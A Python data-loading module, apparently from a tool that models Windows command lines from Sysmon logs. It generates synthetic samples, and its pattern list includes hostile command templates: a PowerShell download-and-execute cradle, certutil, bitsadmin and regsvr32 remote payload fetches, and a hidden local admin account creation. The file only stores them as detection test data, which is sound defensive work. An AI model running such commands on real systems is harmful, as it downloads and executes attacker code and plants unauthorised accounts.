"""
Data loading utilities for TCLaaC project.

This module provides functions to load command-line data from various sources:
- CSV files
- Synthetic/mock data generation (for testing)
- Sysmon message parsing
"""

import pandas as pd
import numpy as np
import random
from typing import Optional, List
import logging

from config import COMMON_EXECUTABLES, COMMON_PATTERNS, RANDOM_STATE

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)


def load_from_csv(filepath: str, column_name: str = 'command_line') -> pd.DataFrame:
    """
    Loads command-line data from a CSV file.
    
    Args:
        filepath: Path to the CSV file
        column_name: Name of the column containing command-line strings
        
    Returns:
        DataFrame with a 'command_line' column
        
    Raises:
        FileNotFoundError: If the CSV file doesn't exist
        KeyError: If the specified column is not found
    """
    try:
        df = pd.read_csv(filepath)
    except FileNotFoundError:
        logger.error(f"File not found: {filepath}")
        raise
    
    if column_name not in df.columns:
        raise KeyError(
            f"Column '{column_name}' not found in CSV. "
            f"Available columns: {', '.join(df.columns)}"
        )
    
    # Rename to standard column name if different
    if column_name != 'command_line':
        df = df.rename(columns={column_name: 'command_line'})
    
    # Keep only the command_line column
    df = df[['command_line']].copy()
    
    # Remove any null values
    initial_count = len(df)
    df = df.dropna(subset=['command_line'])
    dropped = initial_count - len(df)
    
    if dropped > 0:
        logger.info(f"Dropped {dropped} rows with null values")
    
    return df


def generate_synthetic_data(num_samples: int = 10000, seed: Optional[int] = None) -> pd.DataFrame:
    """
    Generates synthetic command-line data for testing.
    
    Creates realistic-looking Windows command lines using common patterns
    and executables, with variations in arguments and parameters.
    
    Args:
        num_samples: Number of synthetic command lines to generate
        seed: Random seed for reproducibility (uses config.RANDOM_STATE if None)
        
    Returns:
        DataFrame with a 'command_line' column containing synthetic data
    """
    if seed is None:
        seed = RANDOM_STATE
    
    random.seed(seed)
    np.random.seed(seed)
    
    commands = []
    
    # Define various command patterns with placeholders
    patterns = [
        # PowerShell commands
        'powershell.exe -ExecutionPolicy Bypass -File C:\\Temp\\script_{id}.ps1',
        'powershell.exe -Command "Get-Process | Where-Object {{$_.CPU -gt {num}}}"',
        'powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand {base64}',
        'powershell.exe IEX (New-Object Net.WebClient).DownloadString("http://{ip}/payload.ps1")',
        
        # CMD commands
        'cmd.exe /c whoami',
        'cmd.exe /c net user admin{id} P@ssw0rd{num} /add',
        'cmd.exe /c dir C:\\Users\\{user}\\Documents',
        'cmd.exe /c type C:\\file_{id}.txt',
        'cmd.exe /c echo {guid} > C:\\Temp\\output_{id}.txt',
        
        # WMIC commands
        'wmic process call create "notepad.exe"',
        'wmic process where name="explorer.exe" get commandline',
        'wmic qfe list',
        'wmic product get name,version',
        
        # Registry commands
        'reg.exe add HKLM\\Software\\Test{id} /v Value{num} /t REG_SZ /d data',
        'reg.exe query HKCU\\Software\\Microsoft\\Windows',
        'reg.exe delete HKLM\\Software\\Temp{id} /f',
        
        # Scheduled tasks
        'schtasks.exe /create /tn Task{id} /tr C:\\Windows\\System32\\calc.exe /sc daily',
        'schtasks.exe /query /fo LIST /v',
        'schtasks.exe /delete /tn Task{id} /f',
        
        # Network commands
        'net.exe user',
        'net.exe group administrators',
        'net.exe use \\\\{ip}\\share /user:domain\\user{id}',
        'netsh.exe advfirewall firewall add rule name="Rule{id}" dir=in action=allow',
        
        # Certutil (LOLBAS)
        'certutil.exe -urlcache -split -f http://{ip}/file{id}.exe C:\\Temp\\file.exe',
        'certutil.exe -decode C:\\encoded{id}.txt C:\\decoded.exe',
        
        # Bitsadmin (LOLBAS)
        'bitsadmin.exe /transfer job{id} http://{ip}/file.exe C:\\Temp\\downloaded.exe',
        
        # Rundll32 (LOLBAS)
        'rundll32.exe C:\\Windows\\System32\\shell32.dll,Control_RunDLL C:\\Windows\\System32\\intl.cpl',
        'rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication ";document.write()',
        
        # Regsvr32 (LOLBAS)
        'regsvr32.exe /s /u /i:http://{ip}/script.sct scrobj.dll',
        
        # MSBuild (LOLBAS)
        'C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\MSBuild.exe C:\\Temp\\build{id}.xml',
        
        # Normal legitimate commands
        'C:\\Program Files\\Microsoft Office\\Office16\\WINWORD.EXE /n "C:\\Users\\{user}\\Documents\\doc{id}.docx"',
        'C:\\Windows\\System32\\notepad.exe C:\\file{id}.txt',
        'C:\\Windows\\explorer.exe /select,C:\\Users\\{user}\\Desktop\\file{id}.pdf',
        'C:\\Program Files\\Mozilla Firefox\\firefox.exe -url http://example{id}.com',
    ]
    
    # Generate varied parameters
    for i in range(num_samples):
        pattern = random.choice(patterns)
        
        # Replace placeholders with varied values
        command = pattern.format(
            id=random.randint(1000, 9999),
            num=random.randint(10, 1000),
            user=random.choice(['Administrator', 'User', 'Guest', f'User{random.randint(1, 100)}']),
            ip=f'{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}',
            guid=f'{random.randint(10000000, 99999999):08x}-{random.randint(1000, 9999):04x}-{random.randint(1000, 9999):04x}-{random.randint(1000, 9999):04x}-{random.randint(100000000000, 999999999999):012x}',
            base64=''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=', k=64))
        )
        
        commands.append(command)
    
    df = pd.DataFrame({'command_line': commands})
    
    return df


def load_from_sysmon_messages(messages: List[str]) -> pd.DataFrame:
    """
    Extracts command lines from Sysmon Event ID 1 message strings.
    
    Sysmon messages contain multiple fields. This function extracts the
    CommandLine field specifically.
    
    Args:
        messages: List of Sysmon message strings
        
    Returns:
        DataFrame with extracted command lines
    """
    from helpers import extract_command_line
    
    logger.info(f"Extracting command lines from {len(messages)} Sysmon messages...")
    
    command_lines = [extract_command_line(msg) for msg in messages]
    
    # Filter out None values
    command_lines = [cmd for cmd in command_lines if cmd is not None]
    
    df = pd.DataFrame({'command_line': command_lines})
    logger.info(f"Extracted {len(df)} valid command lines")
    
    return df


def create_sample_csv(output_path: str = 'sample_data.csv', num_samples: int = 1000):
    """
    Creates a sample CSV file with synthetic data for testing.
    
    Args:
        output_path: Path where the CSV file should be saved
        num_samples: Number of samples to generate
    """
    logger.info(f"Creating sample CSV at {output_path} with {num_samples} samples...")
    
    df = generate_synthetic_data(num_samples)
    df.to_csv(output_path, index=False)
    
    logger.info(f"✓ Sample CSV created successfully: {output_path}")
    print(f"\nSample data preview:")
    print(df.head(10))


def validate_dataframe(df: pd.DataFrame) -> bool:
    """
    Validates that a DataFrame is suitable for analysis.
    
    Args:
        df: DataFrame to validate
        
    Returns:
        True if valid, raises exception otherwise
        
    Raises:
        ValueError: If DataFrame is invalid
    """
    if df is None or df.empty:
        raise ValueError("DataFrame is empty or None")
    
    if 'command_line' not in df.columns:
        raise ValueError("DataFrame must have a 'command_line' column")
    
    # Check for minimum viable data
    non_null = df['command_line'].notna().sum()
    if non_null < 10:
        raise ValueError(f"Too few valid command lines: {non_null} (minimum 10 required)")
    
    # Check for duplicate heavy datasets
    duplicates = df['command_line'].duplicated().sum()
    duplicate_ratio = duplicates / len(df)
    if duplicate_ratio > 0.95:
        logger.warning(
            f"Dataset is {duplicate_ratio*100:.1f}% duplicates. "
            "May affect topic modeling quality."
        )
    
    return True


# Example usage demonstration
if __name__ == '__main__':
    print("=== TCLaaC Data Loader Demo ===\n")
    
    # Generate synthetic data
    print("1. Generating synthetic data...")
    synthetic_df = generate_synthetic_data(num_samples=50)
    print(synthetic_df.head(10))
    
    # Create sample CSV
    print("\n2. Creating sample CSV file...")
    create_sample_csv('sample_sysmon_data.csv', num_samples=100)
    
    # Load from CSV
    print("\n3. Loading from CSV...")
    loaded_df = load_from_csv('sample_sysmon_data.csv')
    print(f"Loaded {len(loaded_df)} rows")
    
    # Validate
    print("\n4. Validating DataFrame...")
    validate_dataframe(loaded_df)
    
    print("\n✓ All data loader functions working correctly!")
